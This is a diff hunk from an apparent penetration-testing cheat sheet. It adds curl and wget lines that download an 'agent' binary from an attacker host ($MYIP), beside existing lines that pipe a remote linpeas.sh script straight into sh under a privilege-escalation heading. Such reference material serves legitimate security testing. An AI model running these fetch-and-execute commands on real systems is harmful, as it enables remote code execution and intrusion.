@@ -1476,6 +1476,8 @@ export PATH=/dev/shm:$PATH
 [*] File Transfer
 curl -s http://$MYIP:139/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:139/linux/linpeas.sh | sh
+curl http://$MYIP:139/linux/agent -o agent
+wget http://$MYIP:139/linux/agent -O agent
 
 [*] Privilege Escalation
 +---------- Priv Check ----------+
